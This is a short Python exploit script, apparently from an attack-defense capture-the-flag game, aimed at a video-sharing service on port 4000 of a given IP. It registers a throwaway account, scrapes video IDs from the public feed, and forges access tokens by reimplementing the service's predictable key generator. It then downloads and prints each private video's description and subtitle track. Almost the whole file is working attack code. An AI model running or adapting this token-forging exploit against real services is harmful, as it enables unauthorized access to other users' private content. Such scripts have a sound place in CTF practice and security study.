import requests
import secrets
import sys
import tempfile
import subprocess
import os
import re
from bs4 import BeautifulSoup


def generate_key(n, alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", a = 17, c = 42, tok_size = 16):
    rseed = n
    out = ""
    for i in range(30):
        rseed = (rseed * 17 + 42) % len(alpha)
        out += alpha[rseed]
    return out

def register(host):
    username = secrets.token_hex(14)
    password = secrets.token_hex(14)

    sess = requests.Session()
    r = sess.post(host + '/register', data={'login': username, 'password': password})
    return sess

def add_access(host, sess, v_id):
    resp = sess.post(host + '/access', data = {'videoID': v_id, 'token': generate_key(int(v_id))})
    return resp.status_code == 200, resp.url


ip = sys.argv[1]

r = re.compile(r'<b>ID:</b> (\d+)</p>')

host = f'http://{ip}:4000'

sess = register(host)

resp = requests.get(host + '/feed')

for v_id in r.findall(resp.text):
    s, url = add_access(host, sess, v_id)
    if s:
        sp = BeautifulSoup(sess.get(url).text, features='lxml')
        track_src =  sp.video.track.get('src')
        descr = sp.find('h4', attrs={'class': 'ui header'}).text
        print(descr)
        print(sess.get(host + track_src).text)

